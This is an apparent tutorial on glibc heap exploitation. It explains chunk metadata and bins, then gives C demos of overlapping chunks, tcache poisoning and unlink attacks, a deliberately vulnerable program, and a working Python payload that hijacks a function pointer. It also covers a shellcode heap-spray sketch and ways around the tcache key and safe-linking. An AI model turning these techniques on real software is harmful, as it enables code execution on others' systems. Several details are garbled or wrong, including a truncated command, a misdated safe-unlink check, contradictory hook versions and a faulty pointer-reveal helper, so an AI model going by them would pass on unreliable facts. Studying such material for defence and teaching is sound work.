Heap Overflows

Heap overflows - corrupting heap chunk metadata, overwriting adjacent objects, tcache/fastbin attacks, and the glibc heap internals that make exploitation possible.

Overview

The heap is where a program stores data whose lifetime is not tied to a function call. When code copies more bytes than a heap buffer can hold, the overflow lands in allocator metadata or in a neighboring object instead of in a return address. This article explains how the glibc allocator lays out chunks, how corrupted metadata becomes overlap, double-free, and write primitives, and how each protection added since glibc 2.26 changed the exploitation techniques.

Heap vs Stack Differences

A stack overflow is straightforward: overwrite the return address, control RIP . A heap overflow has no return address to overwrite. The heap is a complex data structure managed by the allocator ( malloc / free in glibc). Overflowing a heap buffer means corrupting either:

  1. Chunk metadata - the headers glibc uses to manage allocated and free memory
  2. Adjacent allocated objects - other application data, function pointers, or C++ vtables

The exploitation strategies are fundamentally different. You're corrupting the allocator's internal state, then triggering a chain of events that converts metadata corruption into arbitrary code execution.

The Glibc Heap Chunk Structure

Every heap allocation is tracked by a chunk header. The header sits just before the user data pointer returned by malloc : 

struct malloc_chunk {
    size_t  prev_size;   // Size of previous chunk (if prev is free)
    size_t  size;        // Size of this chunk | flags (low 3 bits)
    // User data starts here, but if chunk is free:
    struct malloc_chunk *fd;   // Forward pointer (free list)
    struct malloc_chunk *bk;   // Backward pointer (free list)
    // For large bins only:
    struct malloc_chunk *fd_nextsize;
    struct malloc_chunk *bk_nextsize;
};

Memory layout of an allocated chunk:

Low address
+------------+
| prev_size  | 8 bytes (only meaningful if previous chunk is free)
+------------+
| size       | 8 bytes (chunk size | flags in low 3 bits)
+------------+  <- malloc() returns pointer to here
| User data  |
| ...        |
+------------+
High address

The size field's low 3 bits encode flags:

Bit Name Meaning
0 PREV_INUSE Previous chunk is allocated (1) or free (0)
1 IS_MMAPPED Chunk was allocated via mmap (1)
2 NON_MAIN_ARENA Chunk belongs to a thread arena (1)

Chunk sizes are always aligned to 8 bytes (32-bit) or 16 bytes (64-bit). The minimum chunk size is 4 machine words: prev_size , size , fd , bk .

Glibc Bins - Free List Organization

Free chunks are organized into bins - doubly-linked lists of chunks of similar size:

Bin Type Count Size Range Order
Tcache 64 bins per thread 24-1032 bytes (step size 16) LIFO (singly-linked)
Fastbins 10 bins 32-128 bytes (default) LIFO (singly-linked)
Smallbins 62 bins 32-1008 bytes FIFO (doubly-linked)
Largebins 63 bins 1024+ bytes Sorted by size, descending
Unsorted bin 1 Any size FIFO (cache for recently freed chunks)

Tcache (Thread Cache, glibc 2.26+): Per-thread LIFO cache. Each bin holds at most 7 chunks. Tcache is the first place malloc looks, and the first place free returns chunks. Its simplicity (no integrity checks in early versions) makes it the most targeted bin for exploitation.

Fastbins : Singly-linked LIFO lists for small chunks (chunk size up to 128 bytes by default on x86-64). Fastbins are never merged - chunks in fastbins keep their PREV_INUSE bit set so adjacent chunks don't coalesce.

The Heap Overflow Primitive

A classic heap overflow:

// heap_overflow.c — Overflow from one heap chunk into the next
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    char *a = malloc(64);  // Chunk A
    char *b = malloc(64);  // Chunk B — adjacent in memory

    printf("A: %p, B: %p\n", a, b);
    printf("Distance: %ld bytes\n", b - a);

    // The user data of A is 64 bytes. The actual chunk is larger
    // because of the header. strcpy past 64 bytes overwrites B's header.
    strcpy(a, "AAAA...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

    free(b);  // Corrupted B's metadata — this may crash or misbehave
    free(a);
    return 0;
}

The distance between a and b is not 64 - it's 64 + 16 (chunk header overhead). On x86-64, malloc(64) returns a chunk of size 80 (64 usable + 16 header). The next chunk starts at a + 80 , but a + 64 is where the user data of A nominally ends.

Layout:

[MALLOC_CHUNK A]
  prev_size: 0
  size:      0x51 (80 | PREV_INUSE)
  user data: 64 bytes of AAAAA...
  [OVERFLOW STARTS HERE — beyond A's 64 bytes]
  [bytes 65-72: overwrite B's prev_size]
  [bytes 73-80: overwrite B's size field]
  [bytes 81+:   overwrite B's user data]

[MALLOC_CHUNK B]
  prev_size: OVERWRITTEN
  size:      OVERWRITTEN
  user data: OVERWRITTEN

Attack Vector 1 - Overlapping Chunks

By overwriting the size field of chunk B, you can make the allocator believe B is a different size. When B is freed and then reallocated, the returned chunk may overlap with a third chunk C: 

// overlapping_chunks.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    char *a = malloc(0x38);  // Chunk A: chunk size 0x41
    char *b = malloc(0x38);  // Chunk B: chunk size 0x41
    char *c = malloc(0x38);  // Chunk C: chunk size 0x41

    // Corrupt B's size field: make it 0x81 (covers B + C)
    // This requires overflowing from A into B's header
    strcpy(a, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
              "AAAAAAAA"       // Overwrite B's prev_size
              "\x81\x00\x00\x00\x00\x00\x00\x00");  // B's size = 0x81

    free(b);  // Free B (now with fake size 0x81 -> covers B+C)
    char *d = malloc(0x78);  // Allocate 0x78 -> returns B, but covers B+C
    // d now overlaps with c — wri to d overwrites c's chunk
    return 0;
}

After this, d points to the same memory region that contains both chunk B and chunk C. Writing to d can modify chunk C's data and metadata, even though c is still "allocated."

Attack Vector 2 - Tcache Poisoning

Tcache is a singly-linked LIFO list. Each tcache entry points to the next free chunk via the fd pointer (which lives at the start of the user data area for a free chunk). No integrity checks in the basic tcache (glibc < 2.29 had none; 2.29 added a simple tcache_key sabotage check).

Overwriting tcache fd

// tcache_poison.c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    // Step 1: malloc two chunks of the same size
    char *a = malloc(0x48);  // tcache size 0x50
    char *b = malloc(0x48);

    // Step 2: free chunk a -> goes to tcache
    free(a);

    // Step 3: overflow from... wait, we need an overflow source.
    // In a real scenario, assume we can write past some other chunk.
    // Here, use a use-after-free (simulated):
    // a is free, but we assume we have a dangling pointer
    // OR: overflow from a chunk before a into a's freed fd pointer

    // For demo: directly overwrite a's fd (simulating overflow)
    // Target: overwrite __free_hook with system
    unsigned long *fd_ptr = (unsigned long *)a;
    *fd_ptr = (unsigned long)0xdeadbeef;  // target address - 0x10

    // Step 4: malloc twice. First returns a. Second returns the target.
    char *x = malloc(0x48);  // returns a
    char *y = malloc(0x48);  // returns address at 0xdeadbeef

    printf("x = %p, y = %p\n", x, y);
    return 0;
}

The mechanism:

Initial state (after free(a)):
  tcache[0x50] -> a -> NULL
  a->fd = NULL

After overwriting a->fd:
  tcache[0x50] -> a -> 0xdeadbeef -> ??? (we target this address)

First malloc(0x48):
  returns a, pops a off tcache
  tcache[0x50] -> 0xdeadbeef

Second malloc(0x48):
  returns 0xdeadbeef
  tcache[0x50] -> (0xdeadbeef)->fd (whatever is there)

The second malloc returns an arbitrary address. Write to y , and you write to 0xdeadbeef . This is an arbitrary-write primitive.

Attack Vector 3 - Unsafe Unlink

Before glibc 2.26 added safe unlinking, corrupting the fd/bk pointers of a free chunk allowed an arbitrary write through the unlink macro. The original unlink was: 

// OLD (unsafe) unlink macro — glibc < 2.26
#define unlink(AV, P, BK, FD) {                    \
    FD = P->fd;                                     \
    BK = P->bk;                                     \
    FD->bk = BK;    // Write BK to FD+0x18          \
    BK->fd = FD;    // Write FD to BK+0x10          \
}

If an attacker overwrites P->fd and P->bk with controlled values, they can write arbitrary data at arbitrary locations. Specifically, if:

  • P->fd = target_address - 0x18
  • P->bk = value_to_write

Then FD->bk = BK becomes *(target_address) = value_to_write - a direct arbitrary write.

Modern glibc replaced this with safe unlinking, which verifies the integrity of the doubly-linked list: 

// CURRENT (safe) unlink — glibc >= 2.26
if (FD->bk != P || BK->fd != P) {
    malloc_printerr("corrupted double-linked list");
    abort();
}
FD->bk = BK;
BK->fd = FD;

This check ( FD->bk == P and BK->fd == P ) ensures the pointers are consistent. To pass the check: - P->fd must point to a location where *(location + 0x18) == P - P->bk must point to a location where *(location + 0x10) == P

If you know a pointer to chunk P in memory (e.g., a global variable pointing to the chunk), you can forge valid fd/bk that pass the check. The technique shifted from "any target" to "targets where there's a pointer back to P."

Attack Vector 4 - Unsorted Bin Attack

When a chunk is freed into the unsorted bin, its fd and bk pointers are set to point into the main_arena structure (specifically, the bins[0] and bins[1] fields). By corrupting the bk pointer of a chunk in the unsorted bin, you can write &main_arena.bins[0] to an arbitrary location: 

victim->bk = target - 0x10;  // Corrupt bk (via overflow)
// When the next malloc triggers sorting:
bck = victim->bk;
// ... later ...
bck->fd = unsorted_chunks(av);  // *(target - 0x10 + 0x10) = &main_arena

This writes a libc address ( &main_arena.bins[0] ) to the target location. While you can't control what is written (it's always a libc address), you can control where it's written. Common target: _IO_list_all to trigger a FILE stream attack, or global_max_fast to extend the fastbin range.

Complete Exploit Walkthrough

A realistic scenario: a program allocates objects that contain function pointers, and a heap overflow overwrites those pointers. 

// vuln_heap.c — Heap overflow targeting function pointers
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct command {
    char name[32];
    void (*execute)(const char *);
};

void cmd_list(const char *arg)  { printf("List: %s\n", arg); }
void cmd_help(const char *arg)  { printf("Help: %s\n", arg); }
void cmd_win(const char *arg)   { printf("WIN! %s\n", arg); }

int main(void) {
    char *buffer     = malloc(64);     // Chunk 1: overflow source
    struct command *cmd1 = malloc(sizeof(struct command)); // Chunk 2
    struct command *cmd2 = malloc(sizeof(struct command)); // Chunk 3

    // Initialize command objects
    strcpy(cmd1->name, "list");
    cmd1->execute = cmd_list;

    strcpy(cmd2->name, "help");
    cmd2->execute = cmd_help;

    // Read input (vulnerable — no bounds check)
    printf("Enter command: ");
    ssize_t n = read(STDIN_FILENO, buffer, 256);  // buffer only 64!
    buffer[n] = '\0';

    printf("Arg: ");
    strncpy(cmd1->name, buffer, 31);

    // Execute the command
    cmd1->execute(buffer);

    free(buffer);
    free(cmd1);
    free(cmd2);
    return 0;
}

Compile for exploit testing:

$ gcc -fno-stack-protector -no-pie -o vuln_heap vuln_heap.c

Check chunk layout:

$ gdb ./vuln_heap
(gdb) break main
(gdb) run
(gdb) next  # step past the mallocs
(gdb) print buffer
$1 = 0x5555555592a0
(gdb) print cmd1
$2 = 0x5555555592f0
(gdb) print cmd2
$3 = 0x555555559330
(gdb) print cmd2 - cmd1
$4 = 0x40  # 64 bytes between command objects (40 bytes struct + 24 bytes overhead)

Overflow buffer past 64 bytes to overwrite cmd1 's execute function pointer: 

buffer (64 bytes user data + 16 header)     @ 0x5555555592a0
cmd1  (40 bytes struct + 16 header)          @ 0x5555555592f0
cmd2  (40 bytes struct + 16 header)          @ 0x555555559330

Offset from buffer to cmd1->execute: (0x5555555592f0 - 0x5555555592a0) + 32 = 0x50 + 32 = 112

Verify the offset:

$ python3 -c "

offset to cmd1 struct: 80 bytes
execute_field_offset: 112 bytes

Build payload:

# exploit_heap.py
import struct
import sys

# Address to overwrite execute function pointer with
win_addr = 0x4011a9  # address of cmd_win (from objdump -t vuln_heap | grep cmd_win)

payload  = b"A" * 112               # Fill buffer, overflow through chunk header + struct
payload += struct.pack("<Q", win_addr)  # Overwrite cmd1->execute
payload += b"\n"                      # Input terminator

sys.stdout.buffer.write(payload)
						
$ python3 exploit_heap.py | ./vuln_heap

The program calls cmd_win instead of cmd_list . The function pointer was overwritten by the heap overflow.

Glibc Heap Exploitation Targets

Common targets for converting heap corruption into code execution:

Target Glibc Version How
__malloc_hook < 2.26 Function pointer called before every malloc; overwrite to redirect
__free_hook < 2.26 Called before every free; overwrite to system()
__realloc_hook < 2.26 Called before every realloc
__malloc_hook+ one_gadget < 2.26 Write one_gadget address to __malloc_hook
_IO_list_all All Overwrite to trigger virtual function call in FILE structures
__free_hookvia tcache 2.26-2.33 Arbitrary write to __free_hook address
exit_funcs All Overwrite atexit handler pointers
_dl_fini/link_map All Corrupt link_map->l_addr to redirect finalizer

__malloc_hook and __free_hook were removed in glibc 2.34 because they were the most abused exploitation primitives in history.

Locating Hooks

Find the offset of __malloc_hook from the main_arena: 

$ python3 -c "
from pwn import *
libc = ELF('/usr/lib/libc.so.6')
print(f'__malloc_hook: {hex(libc.symbols[\"__malloc_hook\"])}')
print(f'__free_hook:   {hex(libc.symbols[\"__free_hook\"])}')
print(f'main_arena:    {hex(libc.symbols[\"main_arena\"])}')
"

The main_arena is near __malloc_hook . In glibc, __malloc_hook is at main_arena - 0x10 . You can compute one from a leak of the other.

Tcache Key Protection

Glibc 2.29 added a tcache_key field to detect double-frees. The tcache entry structure became: 

typedef struct tcache_entry {
    struct tcache_entry *next;   // Next entry in singly-linked list
    struct tcache_perthread_struct *key;  // Pointer to tcache structure
} tcache_entry;

Before freeing a chunk to tcache, glibc checks if chunk->key == tcache - if so, the chunk is already in tcache (double-free detected): 

// Simplified glibc 2.29+ tcache_put
if (chunk->key == tcache) {
    // Double free detected — abort
}
chunk->key = tcache;
chunk->next = tcache->entries[idx];
tcache->entries[idx] = chunk;
tcache->counts[idx]++;

To bypass: if you can overwrite the key field (via a heap overflow of the preceding chunk), you can clear it, allowing a double-free. Alternatively, free 7 chunks to fill the tcache (the 8th goes to fastbins/unsorted bin), then perform your attack.

Safe-Linking Protection

Glibc 2.32 added safe-linking - the fd/next pointer in tcache and fastbin chunks is XORed with the address of the chunk itself shifted right by 12 bits: 

#define PROTECT_PTR(pos, ptr)  ((size_t)(pos) >> 12) ^ ((size_t)(ptr))
#define REVEAL_PTR(ptr)        PROTECT_PTR(ptr, ptr)

// Storing:
chunk->next = PROTECT_PTR(&chunk->next, target_chunk);

// Loading:
next_chunk = REVEAL_PTR(chunk->next);

To forge a safe-linked pointer, you need to know the address of the chunk whose next pointer you're overwriting. If you have a heap leak, you can compute the correct XOR mask: 

def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

def reveal_ptr(mangled):
    return (mangled >> 12) ^ mangled

# To forge a pointer from chunk to target:
chunk_addr = 0x5555555592a0  # Known through leak
target = 0x7ffff7e00000       # Target address
mangled = protect_ptr(chunk_addr + offset_of_next, target)

Safe-linking raises the bar: you need a heap address leak in addition to the overflow primitive.

Heap Exploitation Methodology

1. Identify the bug (overflow, UAF, double-free) and constraints
2. Determine heap layout (chunk sizes, adjacency, ordering)
3. Choose attack strategy based on glibc version and available primitives
4. Leak heap addresses (for safe-linking bypass, if needed)
5. Leak libc addresses (for hook/one_gadget targeting)
6. Corrupt metadata or pointers
7. Trigger controlled allocation (malloc) or deallocation (free)
8. Redirect execution (overwrite a hook, function pointer, or vtable entry)

Heap Allocation and mmap

Not all heap memory comes from brk/sbrk. Large allocations (default > 128 KB) use mmap directly:

$ cat /proc/meminfo | grep MmapThreshold

Chunks allocated via mmap have the IS_MM AP PED (0x2) flag in size. They are not subject to bin management - free() calls munmap() directly. 

// Demonstrating mmap-chunk boundary
char *big = malloc(256 * 1024);  // 256 KB -> mmap'd
char *small = malloc(128);       // brk'd heap

// big's chunk header:
// size = 0x40002 (0x40000 | IS_MMAPPED)

Heap Spray

Heap spray fills the heap with many copies of your payload, making the address space predictable. Common in JavaScript/browser exploits where you can allocate lots of strings/arrays but can't control exact placement: 

# Conceptual heap spray
spray_size = 0x1000
payload = nop_sled + shellcode
allocation = payload + b"\x00" * (spray_size - len(payload))

for i in range(1000):
    malloc(spray_size, allocation)  # Fill the heap with copies

After the spray, large regions of the address space contain the payload. Even if you don't know the exact address, a jump to a sprayed region has a high probability of landing on the NOP sled.

Heap vs Stack Overflow

Property Stack Overflow Heap Overflow
Target Return address -> RIP Metadata, function pointers, vtables
Determinism High (stack layout is predictable) Medium (heap layout depends on allocation patterns)
Mitigation discovery Compiler level (canaries) Allocator level (safe unlinking, tcache key, safe-linking)
Exploit complexity Low to medium High (requires understanding of allocator internals)
Tools GDB, pwntools, ROPgadget pwndbg heap commands, ltrace, valgrind
glibc version sensitivity Low (call/ret hasn't changed) Very high (protections added every glibc release)

Heap exploitation requires deep knowledge of the allocator's implementation - its data structures, algorithms, and integrity checks. Every glibc version changes the playing field. The core principles (corrupt metadata -> convert to primitives -> redirect execution) remain constant, but the specific techniques evolve with each release.
